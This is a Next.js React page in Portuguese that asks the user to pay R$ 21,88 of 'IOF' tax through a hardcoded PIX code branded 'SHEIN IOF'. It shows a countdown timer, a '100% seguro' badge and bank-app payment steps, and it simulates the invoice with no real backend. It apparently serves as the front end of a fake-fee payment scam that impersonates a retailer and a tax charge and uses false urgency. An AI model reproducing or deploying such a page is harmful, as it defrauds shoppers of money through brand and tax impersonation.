"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Copy, CheckCircle, ArrowLeft } from "lucide-react"

export default function IOFCheckoutPage() {
  const [timeLeft, setTimeLeft] = useState(600) // 10 minutos em segundos
  const [copied, setCopied] = useState(false)
  const [invoice, setInvoice] = useState(null)
  const [loading, setLoading] = useState(true)
  const router = useRouter()

  const pixCode =
    "00020101021226580014br.gov.bcb.pix2536iof.payment.com/qr/v2/IOF1735456789520400005303986540521.885802BR5909SHEIN IOF5011SAO PAULO62070503***6304A1B2"

  useEffect(() => {
    // Simular criação de fatura IOF
    const createIOFInvoice = async () => {
      try {
        setLoading(true)

        // Simular delay de API
        await new Promise((resolve) => setTimeout(resolve, 1000))

        const iofInvoice = {
          id: `IOF_${Date.now()}`,
          amount: 21.88,
          pix: {
            payload: pixCode,
            qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=200`,
          },
        }

        setInvoice(iofInvoice)
        localStorage.setItem("iofInvoice", JSON.stringify(iofInvoice))
      } catch (error) {
        console.error("Erro ao criar fatura IOF:", error)
      } finally {
        setLoading(false)
      }
    }

    createIOFInvoice()
  }, [])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [timeLeft])

  const copyPixCode = async () => {
    try {
      await navigator.clipboard.writeText(pixCode)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.log("Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return { mins: mins.toString().padStart(2, "0"), secs: secs.toString().padStart(2, "0") }
  }

  const { mins, secs } = formatTime(timeLeft)

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-lg shadow-lg text-center">
          <div className="w-12 h-12 border-4 border-gray-300 border-t-gray-900 rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-md mx-auto">
        {/* Back Button */}
        <button onClick={() => router.back()} className="mb-4 p-2 text-gray-600 hover:text-gray-800">
          <ArrowLeft className="w-5 h-5" />
        </button>

        {/* Main Payment Card */}
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          {/* Header */}
          <div className="text-center mb-6">
            <h1 className="text-xl font-semibold text-gray-900 mb-2">Pagamento do IOF</h1>
            <p className="text-sm text-gray-600">
              Faça o pagamento de <strong>R$ 21,88</strong> referente ao Imposto sobre Operações Financeiras (IOF).
            </p>
          </div>

          {/* Amount Display */}
          <div className="bg-gray-900 text-white text-center py-3 rounded-lg mb-4">
            <span className="text-lg font-semibold">Valor do IOF: R$ 21,88</span>
          </div>

          {/* Status */}
          <div className="bg-gray-100 text-center py-3 rounded-lg mb-6">
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 bg-gray-600 rounded-full animate-pulse"></div>
              <span className="text-sm text-gray-700">Aguardando Pagamento do IOF...</span>
            </div>
          </div>

          {/* Timer */}
          <div className="flex justify-center gap-4 mb-6">
            <div className="bg-gray-200 rounded-lg p-3 text-center min-w-[60px]">
              <div className="text-2xl font-bold text-gray-900">{mins}</div>
              <div className="text-xs text-gray-600">min</div>
            </div>
            <div className="bg-gray-200 rounded-lg p-3 text-center min-w-[60px]">
              <div className="text-2xl font-bold text-gray-900">{secs}</div>
              <div className="text-xs text-gray-600">seg</div>
            </div>
          </div>

          {/* QR Code */}
          <div className="text-center mb-6">
            <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
              <img
                src={invoice?.pix.qr_code || "/placeholder.svg?height=200&width=200"}
                alt="QR Code PIX"
                width={200}
                height={200}
                className="mx-auto"
              />
            </div>
          </div>

          {/* PIX Code */}
          <div className="mb-6">
            <div className="bg-gray-50 p-3 rounded-lg border text-center">
              <p className="text-xs text-gray-600 font-mono break-all">{pixCode}</p>
            </div>
          </div>

          {/* Copy Button */}
          <button
            onClick={copyPixCode}
            className={`w-full py-3 px-6 rounded-lg font-semibold transition-colors mb-4 ${
              copied ? "bg-green-500 text-white" : "bg-gray-900 text-white hover:bg-gray-800"
            }`}
          >
            {copied ? (
              <div className="flex items-center justify-center gap-2">
                <CheckCircle className="w-5 h-5" />
                Código copiado!
              </div>
            ) : (
              <div className="flex items-center justify-center gap-2">
                <Copy className="w-5 h-5" />
                Copiar código PIX
              </div>
            )}
          </button>

          {/* Security */}
          <div className="flex items-center justify-center gap-2 text-sm text-gray-600">
            <div className="w-4 h-4 text-orange-500">🔒</div>
            <span>Pagamento 100% seguro</span>
          </div>
        </div>

        {/* Instructions */}
        <div className="bg-white rounded-lg shadow-sm p-6">
          <h3 className="font-semibold text-gray-900 mb-4">Como pagar o IOF:</h3>

          {/* Option 1 */}
          <div className="mb-6">
            <h4 className="font-medium text-gray-800 mb-3 bg-gray-100 p-3 rounded-lg">Opção 1: Código Copia e Cola</h4>
            <ol className="space-y-2 text-sm text-gray-600 pl-4">
              <li>1. Abra o app do seu banco</li>
              <li>2. Vá em PIX → Pagar</li>
              <li>3. Cole o código copiado</li>
              <li>4. Confirme o pagamento de R$ 21,88</li>
            </ol>
          </div>

          {/* Option 2 */}
          <div>
            <h4 className="font-medium text-gray-800 mb-3 bg-gray-100 p-3 rounded-lg">Opção 2: QR Code</h4>
            <ol className="space-y-2 text-sm text-gray-600 pl-4">
              <li>1. Abra o app do seu banco</li>
              <li>2. Vá em PIX → Ler QR Code</li>
              <li>3. Aponte para o código acima</li>
              <li>4. Confirme o pagamento de R$ 21,88</li>
            </ol>
          </div>
        </div>
      </div>
    </div>
  )
}
